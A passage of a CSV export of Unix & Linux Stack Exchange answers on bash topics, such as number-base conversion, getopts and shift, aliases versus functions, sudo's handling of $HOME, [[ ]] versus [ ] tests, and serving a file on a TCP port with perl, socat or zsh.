base54=${ printf %..54 &quot;$dec&quot;; }
</code></pre>
<p>Which works for bases from 2 to 64 (with <code>0-9a-zA-Z@_</code> as the digits).</p>
<p>With <code>ksh</code> and <code>zsh</code>, there's also:</p>
<pre><code>$ typeset -i34 x=123; echo &quot;$x&quot;
34#3l
</code></pre>
<p>Though that's limited to bases up to 36 in ksh88, zsh and pdksh and 64 in ksh93.</p>
<p>Note that all those are limited to the size of the <code>long</code> integers on your system (<code>int</code>'s with some shells). For anything bigger, you can use <code>bc</code> or <code>dc</code>.</p>
<pre><code>$ echo 'obase=16; 9999999999999999999999' | bc
21E19E0C9BAB23FFFFF
$ echo '16o 9999999999999999999999 p' | dc
21E19E0C9BAB23FFFFF
</code></pre>
<p>With supported bases ranging from 2 to some number required by POSIX to be at least as high as 99. For bases greater than 16, digits greater than 9 are represented as space-separated 0-padded decimal numbers.</p>
<pre><code>$ echo 'obase=30; 123456' | bc
 04 17 05 06
</code></pre>
<p>Or same with <code>dc</code> (<code>bc</code> used to be (and still is on some systems) a wrapper around <code>dc</code>):</p>
<pre><code>$ echo 30o123456p | dc
 04 17 05 06
</code></pre>
"
"How do I suppress dd output?","6699","<bash><sudo><su><dd>","40","<p>From the <code>dd(1)</code> man page:</p>

<pre><code>   status=noxfer
          suppress transfer statistics
</code></pre>

<p>thus:</p>

<pre><code>dd if=boot1h of=""/dev/r$temp1"" status=noxfer
</code></pre>

<p>This still outputs the </p>

<pre><code>0+1 records in
0+1 records out
</code></pre>

<p>garbage when <code>dd</code> exits, so redirecting to a data sink really is your only option.</p>
"
"How to list the open file descriptors (and the files they refer to) in my current bash session","333186","<linux><bash><file-descriptors><open-files>","40","<p>Yes, this will list all open file descriptors:</p>

<pre><code>$ ls -la /proc/$$/fd
total 0
dr-x------ 2 isaac isaac  0 Dec 28 00:56 .
dr-xr-xr-x 9 isaac isaac  0 Dec 28 00:56 ..
lrwx------ 1 isaac isaac 64 Dec 28 00:56 0 -&gt; /dev/pts/6
lrwx------ 1 isaac isaac 64 Dec 28 00:56 1 -&gt; /dev/pts/6
lrwx------ 1 isaac isaac 64 Dec 28 00:56 2 -&gt; /dev/pts/6
lrwx------ 1 isaac isaac 64 Dec 28 00:56 255 -&gt; /dev/pts/6
l-wx------ 1 isaac isaac 64 Dec 28 00:56 4 -&gt; /home/isaac/testfile.txt
</code></pre>

<p>Of course, as usual: 0 is stdin, 1 is stdout and 2 is stderr.<br>
The 4th is an open file (to write) in this case.</p>
"
"How do I remove leading zeroes from output of 'date' or avoid octal interpretation of such decimal numbers?","70966","<bash><shell><date><arithmetic>","40","<ul>
<li><p>In your case, you can simply disable zero padding by append <code>-</code> after <code>%</code> in the format string of date: <code>%-H</code></p>

<blockquote>
  <p>By default, date pads numeric fields with zeroes. The following optional flags may follow '%':</p>
  
  <ul>
  <li><strong><code>-</code> (hyphen) do not pad the field</strong></li>
  <li><code>_</code> (underscore) pad with spaces</li>
  <li><code>0</code> (zero) pad with zeros</li>
  <li><code>^</code> use upper case if possible </li>
  <li><code>#</code> use opposite case if possible</li>
  </ul>
</blockquote>

<p>See <a href=""http://linux.die.net/man/1/date"" rel=""noreferrer"">date manual</a></p></li>
<li><p>If you want to interpret number in different base, in bash</p>

<blockquote>
  <ul>
  <li>Constants with a leading 0 are interpreted as octal numbers.</li>
  <li>A leading 0x or 0X denotes hexadecimal.</li>
  <li><strong>Otherwise, numbers take the form [base#]n, where base is a decimal number between 2 and 64 representing the arithmetic base, and n is a number in that base</strong></li>
  </ul>
</blockquote>

<p>So, to interpret a number as decimal, use <code>10#n</code> form, eg. <code>10#09</code></p>

<pre><code>echo $((10#09*2))
18
</code></pre>

<p>See <a href=""http://www.gnu.org/software/bash/manual/bashref.html#Shell-Arithmetic"" rel=""noreferrer"">Arithmetic Evaluation</a> section of bash manual.</p></li>
</ul>
"
"What does a dollar sign followed by a square bracket $[...] mean in bash?","209833","<bash><arithmetic>","40","<p>You can find <a href=""https://ftp.gnu.org/gnu/bash/"" rel=""noreferrer"">old bash source here</a>.  In particular I downloaded <a href=""https://ftp.gnu.org/gnu/bash/bash-1.14.7.tar.gz"" rel=""noreferrer"">bash-1.14.7.tar.gz</a>.  In the <code>documentation/bash.txt</code> you will find:</p>
<blockquote>
<p>Arithmetic Expansion</p>
<p>Arithmetic expansion allows the evaluation of an arithmetic expression and  the substitution of the result.  There are two formats for arithmetic expansion:</p>
<pre><code>     $[expression]

     $((expression))
</code></pre>
</blockquote>
<p>The references to <code>$[</code> are gone in <code>doc/bash.html</code> from the <a href=""https://ftp.gnu.org/gnu/bash/bash-doc-2.0.tar.gz"" rel=""noreferrer"">bash-doc-2.0.tar.gz download</a> and the <code>NEWS</code> file mentions that:</p>
<blockquote>
<p>The <code>$[...]</code> arithmetic expansion syntax is no longer supported, in favor of <code>$((...))</code>.</p>
</blockquote>
<p><code>$((...))</code> is also the <a href=""https://pubs.opengroup.org/onlinepubs/9699919799.2018edition/utilities/V3_chap02.html#tag_18_06_04"" rel=""noreferrer"">standard syntax</a> for an arithmetic expansion, but may have been added to the standard later than the original Bash implementation.</p>
<p>However, <code>$[...]</code> does still seem to work in Bash 5.0, so it's not completely removed.</p>
"
"Explain the shell command: shift $(($optind - 1))","214141","<bash><shell><shell-script>","40","<p><code>shift $((OPTIND-1))</code> (note <code>OPTIND</code> is upper case) is normally found immediately after a <code>getopts</code> <code>while</code> loop. <s><code>$OPTIND</code> is the number of options found by <code>getopts</code>.</s>  </p>

<p>As pauljohn32 mentions in the comments, strictly speaking, <code>OPTIND</code> gives the position of the <em>next</em> command line argument.</p>

<p>From the GNU <a href=""https://www.gnu.org/software/bash/manual/bash.html#Bourne-Shell-Builtins"" rel=""noreferrer"">Bash Reference Manual</a>:</p>

<blockquote>
  <p><strong>getopts optstring name [args]</strong></p>
  
  <p><code>getopts</code> is used by shell scripts to parse positional parameters.
  <code>optstring</code> contains the option characters to be recognized; if a
  character is followed by a colon, the option is expected to have an
  argument, which should be separated from it by whitespace. The colon
  (‘:’) and question mark (‘?’) may not be used as option characters.
  Each time it is invoked, <code>getopts</code> places the next option in the shell
  variable name, initializing <code>name</code> if it does not exist, and the index
  of the next argument to be processed into the variable <code>OPTIND</code>.
  <code>OPTIND</code> is initialized to 1 each time the shell or a shell script is
  invoked. When an option requires an argument, getopts places that
  argument into the variable <code>OPTARG</code>. The shell does not reset <code>OPTIND</code>
  automatically; it must be manually reset between multiple calls to
  <code>getopts</code> within the same shell invocation if a new set of parameters
  is to be used.</p>
  
  <p>When the end of options is encountered, <code>getopts</code> exits with a return
  value greater than zero. <code>OPTIND</code> is set to the index of the first
  non-option argument, and name is set to ‘?’.</p>
  
  <p><code>getopts</code> normally parses the positional parameters, but if more
  arguments are given in <code>args</code>, <code>getopts</code> parses those instead.</p>
</blockquote>

<p><code>shift</code> <em>n</em><br>
removes <em>n</em> strings from the positional parameters list. Thus <code>shift $((OPTIND-1))</code> removes all the options that have been parsed by <code>getopts</code> from the parameters list, and so after that point, <code>$1</code> will refer to the first non-option argument passed to the script.</p>

<p><strong>Update</strong></p>

<p>As mikeserv mentions in the comment, <code>shift $((OPTIND-1))</code> can be unsafe. To prevent unwanted word-splitting etc, <strong>all</strong> parameter expansions should be double-quoted. So the safe form for the command is</p>

<p><code>shift ""$((OPTIND-1))""</code></p>
"
"How to enable autocompletion for remote paths when using scp?","33336","<bash><ssh><autocomplete>","40","<p>Make sure that you've turned on the fancy autocompletion. On many distributions, this means your <code>~/.bashrc</code> needs to contain <code>. /etc/bash_completion</code>.</p>

<p>You'll need to have passwordless authentication set up, i.e. with a key that's already loaded in <code>ssh-agent</code>.</p>

<p>Establishing an SSH connection is slow, so you can considerably speed up completions by establishing a connection once and for all and using that connection thereafter. The relatively complicated way to do that is to open a master SSH connection with <code>ssh -N -M target-host</code> after setting up master-slave connections in <code>~/.ssh/config</code>; see <a href=""https://unix.stackexchange.com/questions/32984/multiple-ssh-sessions-in-single-command/33012#33012"">Multiple ssh sessions in single command</a> for instructions (you need the <code>ControlMaster</code> and <code>ControlPath</code> options).</p>

<p>The simple method is to mount the remote filesystem over <a href=""http://fuse.sourceforge.net/sshfs.html"" rel=""noreferrer"">SSHFS</a> and use <code>cp</code> with normal shell completion.</p>

<pre><code>mkdir ~/remote
sshfs USER@192.168.178.32:/home/USER ~/remote
cp -p someFile ~/remote/put/it/some/where/oh/damn/you/here
</code></pre>
"
"ASCII to Binary and Binary to ASCII conversion tools?","98948","<bash><binary><ascii>","40","<pre><code>$ echo AB | perl -lpe '$_=unpack""B*""'
0100000101000010
$ echo 0100000101000010 | perl -lpe '$_=pack""B*"",$_'
AB
</code></pre>

<ul>
<li><code>-e <i>expression</i></code> evaluate the given expression as <code>perl</code> code</li>
<li><code>-p</code>: <code>sed</code> mode. The <em>expression</em> is evaluated for each line of input, with the content of the line stored in the <code>$_</code> variable and printed after the evaluation of the <em>expression</em>.</li>
<li><code>-l</code>: even more like <code>sed</code>: instead of the full line, only the <em>content</em> of the line (that is, without the line delimiter) is in <code>$_</code> (and a newline is added back on output). So <code>perl -lpe code</code> works like <code>sed code</code> except that it's <code>perl</code> code as opposed to <code>sed</code> code.</li>
<li><code>unpack ""B*""</code> works on the <code>$_</code> variable by default and extracts its content as a bit string walking from the highest bit of the first byte to the lowest bit of the last byte.</li>
<li><code>pack</code> does the reverse of <code>unpack</code>. See <code>perldoc -f pack</code> for details.</li>
</ul>

<p>With spaces:</p>

<pre><code>$ echo AB | perl -lpe '$_=join "" "", unpack""(B8)*""'
01000001 01000010
$ echo 01000001 01000010 | perl -lape '$_=pack""(B8)*"",@F'
AB
</code></pre>

<p>(it assumes the input is in blocks of 8 bits (0-padded)).</p>

<p>With <code>unpack ""(B8)*""</code>, we extract 8 bits at a time, and we join the resulting strings with spaces with <code>join "" ""</code>.</p>
"
"bash multi line command with comments after the continuation character","19124","<bash><shell>","40","<p>Comments end at the first newline (see <a href=""http://pubs.opengroup.org/onlinepubs/009695399/utilities/xcu_chap02.html#tag_02_03"">shell token recognition rule 10</a>), without allowing <a href=""http://pubs.opengroup.org/onlinepubs/009695399/utilities/xcu_chap02.html#tag_02_02_01"">continuation lines</a>, so this code has <code>foo</code> in a separate command line:</p>

<pre><code>echo # this is a comment \
foo
</code></pre>

<p>As for your first proposal, the backslash isn't followed by a newline, you're just quoting the space: it's equivalent to</p>

<pre><code>echo ' # this is a comment'
foo
</code></pre>

<p><code>$(: this is a comment)</code> substitutes the output of the command <code>: this is a comment</code>. If the output of that command is empty, this is effectively a highly confusing way to insert a comment in the middle of a line.</p>

<p>There's no magic going on: <code>:</code> is an ordinary command, the <a href=""http://pubs.opengroup.org/onlinepubs/009695399/utilities/colon.html"">colon</a> utility, which does nothing. The colon utility is mostly useful when the shell syntax requires a command but you happen to have nothing to do.</p>

<pre><code># Sample code to compress files that don't look compressed
case ""$1"" in
  *.gz|*.tgz|*.bz2|*.zip|*.jar|*.od?) :;; # the file is already compressed
  *) bzip2 -9 ""$1"";;
esac
</code></pre>

<p>Another use case is an idiom for setting a variable if it's not already set.</p>

<pre><code>: ""${foo:=default value}""
</code></pre>

<p>The remark about goto is a historical one. The colon utility dates back from even before the <a href=""http://en.wikipedia.org/wiki/Bourne_shell"">Bourne shell</a>, all the way to the <a href=""http://en.wikipedia.org/wiki/Thompson_shell"">Thompson shell</a>, which had a <a href=""http://en.wikipedia.org/wiki/Thompson_shell"">goto</a> instruction. The colon then meant a label; a colon is a fairly common syntax for goto labels (it's still present in <a href=""http://pubs.opengroup.org/onlinepubs/009695399/utilities/sed.html#tag_04_126_13_03"">sed</a>).</p>
"
"/dev/tcp listen instead of nc listen","49936","<bash><shell><rhel><io-redirection><netcat>","40","<p>If Perl is installed (as it will be on a RHEL machine):</p>

<pre><code>perl -MIO::Socket::INET -ne 'BEGIN{$l=IO::Socket::INET-&gt;new(
  LocalPort=&gt;1234,Proto=&gt;""tcp"",Listen=&gt;5,ReuseAddr=&gt;1);
  $l=$l-&gt;accept}print $l $_' &lt; ~/.bashrc
</code></pre>

<p>would work, unless a local firewall doesn't allow incoming connections to 1234.</p>

<p>If socat is installed:</p>

<pre><code>socat -u - tcp-listen:1234,reuseaddr &lt; ~/.bashrc
</code></pre>

<p>If zsh is installed:</p>

<pre><code>zmodload zsh/net/tcp
ztcp -ld3 1234 &amp;&amp; # start listening socket on fd 3
  ztcp -ad4 3 &amp;&amp; # accept connection on fd 4
  ztcp -c 3 &amp;&amp; # close the listening socket that is no longer needed
  cat &lt; ~/.bashrc &gt;&amp;4 &amp;&amp; # send the data
  ztcp -c 4 # close the communication socket to tell the other end we're finished
</code></pre>
"
"List all binaries from $PATH","120786","<bash><shell><path><executable>","39","<p>This is not an answer, but it's showing binary, a command which you could run</p>

<pre><code>compgen -c
</code></pre>

<p>(assuming <code>bash</code>)</p>

<p>Other useful commands </p>

<pre><code>compgen -a # will list all the aliases you could run.
compgen -b # will list all the built-ins you could run.
compgen -k # will list all the keywords you could run.
compgen -A function # will list all the functions you could run.
compgen -A function -abck # will list all the above in one go.
</code></pre>
"
"Piping from grep to awk not working","46715","<bash><grep><rhel><awk><tail>","39","<p>It's probably output buffering from grep.  you can disable that with <code>grep --line-buffered</code>.</p>

<p>But you don't need to pipe output from grep into awk.  awk can do regexp pattern matching all by itself.</p>

<p><code>tail -f test.txt | awk '/Beam/ {print $3}'</code></p>
"
"Aliases vs functions vs scripts","4023","<bash><shell><alias><function>","39","<p>The main difference between aliases and functions is that aliases don't take arguments¹, but functions do. When you write something like <code>alias l='ls --color'</code>, <code>l foo</code> is expanded to <code>ls --color foo</code>; you can't grab <code>foo</code> into the alias expansion and do something different with it the way you can do with a function. See also <a href=""https://unix.stackexchange.com/questions/3773/how-to-pass-parameter-to-alias/3776#3776"">How to pass parameter to alias?</a>.</p>

<p>Aliases are looked up <em>before</em> functions: if you have both a function and an alias called <code>foo</code>, <code>foo</code> invokes the alias. (If the alias <code>foo</code> is being expanded, it's temporarily blocked, which makes things like <code>alias ls='ls --color'</code> work. Also, you can bypass an alias at any time by running <code>\foo</code>.) I wouldn't expect to see a measurable performance difference though.</p>

<p>Functions and standalone scripts have mostly similar capabilities; here are a few differences I can think of:</p>

<ul>
<li>A function runs inside the shell environment; a script runs in a separate process. Therefore a function can <em>change</em> the shell environment: define environment variables, change the current directory, etc. A standalone script can't do that.</li>
<li>A function must be written in the language of the shell you want to use it in. A script can be written in any language.</li>
<li>Functions are loaded when they are defined. Scripts are loaded each time they are invoked. This has several consequences:

<ul>
<li>If you modify a script, you get the new version the next time you invoke it. If you change a function's definition, you have to reload the definition.</li>
<li>Functions are faster on heavily loaded systems.</li>
<li>If you have a lot of functions that you may not use, they'll take up memory. Ksh and zsh, but I think not bash, have a form of function autoloading.</li>
</ul></li>
</ul>

<p>Something that's intermediate between a function and a standalone script is a script snippet that you read with the <code>source</code> or <code>.</code> builtin. Like a function, it can modify the shell's environment, and must be written in the shell's language. Like a script, it is loaded each time it's invoked and no sooner.</p>

<p>¹ <sub>
Yeah, I know, this doesn't apply to tcsh.
</sub></p>
"
"getopt, getopts or manual parsing - what to use when I want to support both short and long options?","62950","<bash><shell-script><options><user-interface><getopts>","39","<p>If it has to be portable to a range of Unices, you'd have to stick to POSIX sh. And AFAIU there you just have no choice but rolling argument handling by hand.</p>
"
"Why do we need the ""at"" command in Linux?","97882","<bash><at>","39","<p>Bernhard's reply is correct: in multi-user systems, the ability to execute heavy programs at some ungodly hours of the night is especially convenient, for both the person submitting the job, and his coworkers. It is part of ""playing nice"". </p>

<p>I did most of my Ph.D. computations this way, combining the script with the <em>nice</em> command which demoted the priority of my work whenever other people were keeping the machine busy, while leaving intact its ability to hog all the system resources at night. </p>

<p>I used the very same command to check whether my program was running, and to restart it if necessary. </p>

<p>Also, you should keep in mind that <em>at</em> was written way before <em>screen, tmux</em>, and so on, so that it was a simple way to have a detached shell, i.e., one that would not die once you logged off the system. </p>

<p>Lastly, you should also notice that it is different from cron, which also has been around for a long time. The difference lies in the fact that at is occasional, while cron, being so repetitive, is more suited for system jobs which really need to be executed forever at fixed intervals: in fact, <em>at</em> gives you  your own environment, with your own settings (and choices) of environment variable, while <em>cron</em> uses a minimal set of environment variables (just check the difference in <em>PATH</em>, as an example). </p>
"
"View a range of bash history","291285","<bash><command-history>","39","<p>Instead of <code>history</code>, you can use <a href=""https://www.gnu.org/software/bash/manual/bashref.html#Bash-History-Builtins-1""><code>fc</code></a>, which allow you select range:</p>

<pre><code>fc -l 4 7
</code></pre>
"
"Use .sh or .bash extension for bash scripts?","182882","<bash><shell><shebang>","39","<blockquote>
  <p>does using the .bash extension actually invoke bash or does it depend
  on system config / 1st shebang line.</p>
</blockquote>

<p>If you do not use an interpreter explicitly, then the interpreter being invoked is determined by the <code>shebang</code> used in the script. If you use an interpreter specifically then the interpreter doesn't care what extension you give for your script. However, the extension exists to make it very obvious for others what kind of script it is. </p>

<pre><code>[sreeraj@server ~]$ cat ./ext.py
#!/bin/bash
echo ""Hi. I am a bash script""
</code></pre>

<p>See, <code>.py</code> extension to the bash script does not make it a python script.</p>

<pre><code>[sreeraj@server ~]$ python ./ext.py
  File ""./ext.py"", line 2
    echo ""Hi. I am a bash script""
                                ^
SyntaxError: invalid syntax
</code></pre>

<p>Its always a <code>bash</code> script.</p>

<pre><code>[sreeraj@server ~]$ ./ext.py
Hi. I am a bash script
</code></pre>
"
"aliasing cd to pushd - is it a good idea?","4290","<bash><shell><shell-script><alias>","39","<p>Personally, I have these in my bashrc and use them all the time:</p>

<pre><code>pushd()
{
  if [ $# -eq 0 ]; then
    DIR=""${HOME}""
  else
    DIR=""$1""
  fi

  builtin pushd ""${DIR}"" &gt; /dev/null
  echo -n ""DIRSTACK: ""
  dirs
}

pushd_builtin()
{
  builtin pushd &gt; /dev/null
  echo -n ""DIRSTACK: ""
  dirs
}

popd()
{
  builtin popd &gt; /dev/null
  echo -n ""DIRSTACK: ""
  dirs
}

alias cd='pushd'
alias back='popd'
alias flip='pushd_builtin'
</code></pre>

<p>You can then navigate around on the command-line a bit like a browser. <code>cd</code> changes the directory. <code>back</code> goes to the previous directory that you <code>cd</code>ed from. And <code>flip</code> will move between the current and previous directories without popping them from the directory stack. Overall, it works great.</p>

<p>The only real problem that I'm aware of is the fact that it's then a set of commands that I'm completely used to but don't exist on anyone else's machine. So, if I have to use someone else's machine, it can be a bit frustrating. If you're used to just using <code>pushd</code> and <code>popd</code> directly, you don't have that problem. And while if you just alias <code>cd</code> put not <code>popd</code>, you won't have the issue of <code>back</code> not existing, you'll still have the problem that <code>cd</code> doesn't do quite what you expect on other machines.</p>

<p>I would note, however, that your particular implementation of <code>cd</code> doesn't quite work like <code>cd</code> in that the normal <code>cd</code> by itself will go to your home directory, but yours doesn't. The version that I have here doesn't have that problem. Mine also appends <code>DIRSTACK</code> onto the front of the <code>dirs</code> print out, but that's more a matter of personal taste more than anything.</p>

<p>So, as I said, I use these aliases all the time and have no problem with them. It's just that it can be a bit frustrating to have to use another machine and then find them not there (which shouldn't be surprising, but they're one of those things that you use so often that you don't think about them, so having them not work like you're used to can still be surprising).</p>
"
"How do Ubuntu and Debian manage $HOME for users with sudo privileges?","438564","<bash><debian><ubuntu><sudo><home>","39","<p>Both Debian and Ubuntu ship an <code>/etc/sudoers</code> file that contains <code>Defaults env_reset</code>, which resets environment variables.</p>

<p>However, the behavior of <code>env_reset</code> was changed from <em>not</em> touching $HOME to resetting it to the home of the target user.</p>

<p>Ubuntu decided to patch their version of <code>sudo</code> to keep the previous behavior:
<a href=""https://bugs.launchpad.net/ubuntu/+source/sudo/+bug/760140"" rel=""noreferrer"">https://bugs.launchpad.net/ubuntu/+source/sudo/+bug/760140</a></p>

<p>In Ubuntu, in order to reset the $HOME environment variable to the target user, one has to set either <code>Defaults always_set_home</code> or <code>Defaults set_home</code> (in which case only <code>sudo -s</code> will get HOME updated) in their <code>/etc/sudoers</code>.</p>

<p>This bug at Ubuntu tracker has some more rationale on not setting $HOME in sudo:
<a href=""https://bugs.launchpad.net/ubuntu/+source/sudo/+bug/1373495"" rel=""noreferrer"">https://bugs.launchpad.net/ubuntu/+source/sudo/+bug/1373495</a></p>

<p>See comment #4:</p>

<blockquote>
  <p>If HOME is removed, then e.g. vim, bash, etc., will use /root/.vimrc,
  /root/.bashrc, etc rather than the user's ~/.vimrc, ~/.bashrc, etc.
  While it's a bad idea to run X clients via sudo, they too would likely
  look in the wrong locations for configuration files, and there's a
  chance that X11 clients may not even be able to connect to the X11
  server if they are aimed at the wrong .Xauthority file.</p>
</blockquote>

<p>It's a conscious decision by Ubuntu developers.</p>

<p>This answer has more details on the sudoers options such as <code>always_set_home</code>:
<a href=""https://unix.stackexchange.com/a/91572/281844"">https://unix.stackexchange.com/a/91572/281844</a></p>

<hr>

<p>There's a second issue in your question, which is the <code>sudo echo $HOME</code> which still displays the user's home even in Debian.</p>

<p>That happens because the shell is expanding <code>$HOME</code> <em>before</em> running the <code>sudo</code> command.</p>

<p>So this:</p>

<pre><code>$ sudo echo $HOME
</code></pre>

<p>Is first expanded by the shell into:</p>

<pre><code>$ sudo echo /home/user
</code></pre>

<p>And then sudo executes <code>echo /home/user</code> as root...</p>

<p>This should demonstrate the difference too:</p>

<pre><code>$ sudo bash -c 'echo $HOME'
/root
</code></pre>

<p>Or get a full root shell and see the environment variable there:</p>

<pre><code>$ sudo -s
# echo $HOME
/root
</code></pre>
"
"Semicolon in conditional structures","48805","<bash><scripting>","39","<p>The semicolon is needed only when the end of line is missing:</p>

<pre><code>if [ ""a"" == ""a"" ] ; then echo ""true"" ; fi
</code></pre>

<p>Without semicolons, you get Syntax error.</p>

<p>I do not understand your question about quotes. Can you be more specific?</p>

<p>(And by the way, using <code>=</code> instead of <code>==</code> is more portable and POSIX compliant).</p>
"
"What is the difference between [[ $a == z* ]] and [ $a == z* ]?","56655","<bash><shell-script><wildcards><test>","38","<p>The difference between <code>[[ … ]]</code> and <code>[ … ]</code> is mostly covered in <a href=""https://unix.stackexchange.com/questions/32210/using-single-or-double-bracket-bash"">Why does parameter expansion with spaces without quotes work inside double brackets &quot;[[&quot; but not inside single brackets &quot;[&quot;?</a>.
Crucially, <code>[[ … ]]</code> is special syntax, whereas <code>[</code> is a funny-looking name for a command. <code>[[ … ]]</code> has special syntax rules for what's inside, <code>[ … ]</code> doesn't.</p>

<p>With the added wrinkle of a wildcard, here's how <code>[[ $a == z* ]]</code> is evaluated:</p>

<ol>
<li>Parse the command: this is the <code>[[ … ]]</code> conditional construct around the conditional expression <code>$a == z*</code>.</li>
<li>Parse the conditional expression: this is the <code>==</code> binary operator, with the operands <code>$a</code> and <code>z*</code>.</li>
<li>Expand the first operand into the value of the variable <code>a</code>.</li>
<li>Evaluate the <code>==</code> operator: test if the value of the variable <code>a</code> matches the pattern <code>z*</code>.</li>
<li>Evaluate the conditional expression: its result is the result of the conditional operator.</li>
<li>The command is now evaluated, its status is 0 if the conditional expression was true and 1 if it was false.</li>
</ol>

<p>Here's how <code>[ $a == z* ]</code> is evaluated:</p>

<ol>
<li>Parse the command: this is the <code>[</code> command with the arguments formed by evaluating the words <code>$a</code>, <code>==</code>, <code>z*</code>, <code>]</code>.</li>
<li>Expand <code>$a</code> into the value of the variable <code>a</code>.</li>
<li>Perform word splitting and filename generation on the parameters of the command.

<ul>
<li>For example, if the value of <code>a</code> is the 6-character string <code>foo b*</code> (obtained by e.g. <code>a='foo b*'</code>) and the list of files in the current directory is (<code>bar</code>, <code>baz</code>, <code>qux</code>, <code>zim</code>, <code>zum</code>), then the result of the expansion is the following list of words: <code>[</code>, <code>foo</code>, <code>bar</code>, <code>baz</code>, <code>==</code>, <code>zim</code>, <code>zum</code>, <code>]</code>.</li>
</ul></li>
<li>Run the command <code>[</code> with the parameters obtained in the previous step.

<ul>
<li>With the example values above, the <code>[</code> command complains of a syntax error and returns the status 2.</li>
</ul></li>
</ol>

<p>Note: In <code>[[ $a == z* ]]</code>, at step 3, the value of <code>a</code> does not undergo word splitting and filename generation, because it's in a context where a single word is expected (the left-hand argument of the conditional operator <code>==</code>). In most cases, if a single word makes sense at that position then variable expansion behaves like it does in double quotes. However, there's an exception to that rule: in <code>[[ abc == $a ]]</code>, if the value of <code>a</code> contains wildcards, then <code>abc</code> is matched against the wildcard pattern. For example, if the value of <code>a</code> is <code>a*</code> then <code>[[ abc == $a ]]</code> is true (because the wildcard <code>*</code> coming from the unquoted expansion of <code>$a</code> matches <code>bc</code>) whereas <code>[[ abc == ""$a"" ]]</code> is false (because the ordinary character <code>*</code> coming from the quoted expansion of <code>$a</code> does not match <code>bc</code>). Inside <code>[[ … ]]</code>, double quotes do not make a difference, <em>except on the right-hand side of the string matching operators</em> (<code>=</code>, <code>==</code>, <code>!=</code> and <code>=~</code>).</p>
"
"How can I find a rogue alias declaration?","38330","<bash><alias><bashrc>","38","<p>I would look in <code>/etc/profile.d/</code> for the offending <code>alias</code>.</p>

<p>You could also do the following to find it:</p>

<pre><code>grep -r '^alias COMMAND' /etc
</code></pre>

<p>This will recursively <code>grep</code> through files looking for a line beginning with <code>alias COMMAND</code>.</p>

<p>If all else fails, put this at the end of your <code>~/.bashrc</code></p>

<pre><code>unalias COMMAND
</code></pre>
"
"What does : ${param:=value} mean?","25425","<bash><shell><zsh>","38","<p>Let's break this down into pieces.</p>

<p>This code runs the command <code>:</code> with some arguments. The command <code>:</code> does nothing and ignores its arguments. Therefore the whole command line does nothing, except whatever side effects happen in the arguments.</p>

<p>The syntax <code>${parameter_name:=value}</code> exists in all non-antique Bourne-style shells, including ash, bash, ksh and zsh. It sets the parameter to a default if necessary. It is equivalent to</p>

<pre><code>if [ -z ""$parameter_name"" ]; then parameter_name=value; fi
… ${parameter_name}
</code></pre>

<p>In other words, if <code>parameter_name</code> is not set or is set to an empty value, then set it to the indicated value; and then run the command, using the new parameter value. There is a variant, <code>${parameter_name=value}</code>, which leaves the parameter empty if it was empty, only using the indicated value if the parameter was unset.</p>

<p>You'll find this syntax documented under “parameter expansion” in <a href=""http://pubs.opengroup.org/onlinepubs/009695399/utilities/xcu_chap02.html#tag_02_06_02"">the POSIX spec</a>, and the dash, bash, ksh and zsh manuals.</p>

<p>There are variations on this syntax, in particular <code>${parameter_name:-value}</code> which let you use a default value for this expansion only, without assigning to the parameter.</p>

<p>In summary, <code>: ${parameter_name:=value}</code> is a concise way of writing</p>

<pre><code>if [ -z ""$parameter_name"" ]; then parameter_name=value; fi
</code></pre>
"
"Bash Sudo Command Not Found","23572","<bash><sudo>","38","<p>It looks from <a href=""http://www.turnkeylinux.org/redmine"">http://www.turnkeylinux.org/redmine</a> like Redmine, unlike Ubuntu, does not use sudo by default. What username are you using to SSH in? If it's <code>root</code>, then you don't need to use <code>sudo</code>, as everything you do when SSHed in to the Redmine system is done as <code>root</code>. If it's something else, like <code>admin</code>, then you could try using the <code>su</code> command to get a <code>root</code> shell in which to run commands as <code>root</code>.</p>
"
"How to keep Bash running after command execution?","123103","<bash>","38","<pre><code>( exec sh -i 3&lt;&lt;SCRIPT 4&lt;&amp;0 &lt;&amp;3                                        ⏎
    echo ""do this thing""
    echo ""do that thing""
  exec  3&gt;&amp;- &lt;&amp;4
  SCRIPT
)
</code></pre>

<p>This is better done from a script though with <code>exec $0.</code> Or if one of those file descriptors directs to a terminal device that is not currently being used it will help - you've gotta remember, other processes wanna check that terminal, too. </p>

<p>And by the way, if your goal is, as I assume it is, to preserve the script's environment after executing it, you'd probably be a lot better served with : </p>

<pre><code>. ./script
</code></pre>

<p>The shell's <code>.dot</code> and <code>bash's source</code> are not one and the same - the shell's <code>.dot</code> is POSIX specified as a special shell builtin and is therefore as close to being guaranteed as you can get, though this is by no means a guarantee it will be there...  </p>

<p>Though the above should do as you expect with little issue. For instance, you can :</p>

<pre><code> ( exec sh -i 3&lt;&lt;SCRIPT 4&lt;&amp;0 &lt;&amp;3                                        ⏎
    echo ""do this thing""
    echo ""do that thing""
    $(cat /path/to/script)
    exec  3&gt;&amp;- &lt;&amp;4
    SCRIPT
 )
</code></pre>

<p>The shell will run your script and return you to the interactive prompt - so long as you avoid <code>exit</code>ing the shell from your script, that is, or backgrounding your process - that'll link your i/o to <code>/dev/null.</code></p>

<h3>DEMO:</h3>

<pre><code>% printf 'echo ""%s""\n' ""These lines will print out as echo"" \
    ""statements run from my interactive shell."" \
    ""This will occur before I'm given the prompt."" &gt;|/tmp/script
% ( exec sh -i 3&lt;&lt;SCRIPT 4&lt;&amp;0 &lt;&amp;3
    echo ""do this thing""
    echo ""do that thing""
    $(cat /tmp/script)
    exec  3&gt;&amp;- &lt;&amp;4
SCRIPT
)
sh-4.3$ echo ""do this thing""
    do this thing
sh-4.3$ echo ""do that thing""
    do that thing
sh-4.3$ echo ""These lines will print out as echo""
    These lines will print out as echo
sh-4.3$ echo ""statements run from my interactive shell.""
    statements run from my interactive shell.
sh-4.3$ echo ""This will occur before I'm given the prompt.""
    This will occur before I'm given the prompt.
sh-4.3$ exec  3&gt;&amp;- &lt;&amp;4
sh-4.3$
</code></pre>

<h3>MANY <code>JOBS</code></h3>

<p>It's my opinion that you should get a little more familiar with the shell's built-in task management options. @Kiwy and @jillagre have both already touched on this in their answers, but it might warrant further detail. And I've already mentioned one POSIX-specified special shell built-in, but <code>set, jobs, fg,</code> and <code>bg</code> are a few more, and, as another answer demonstrates <code>trap</code> and <code>kill</code> are two more still. </p>

<p>If you're not already receiving instant notifications on the status of concurrently running backgrounded  processes, it's because your current shell options are set to the POSIX-specified default of <code>-m</code>, but you can get these asynchronously with <code>set -b</code> instead:</p>

<pre><code>% man set
</code></pre>

<blockquote>
<pre><code>    −b This option shall be supported if the implementation supports the
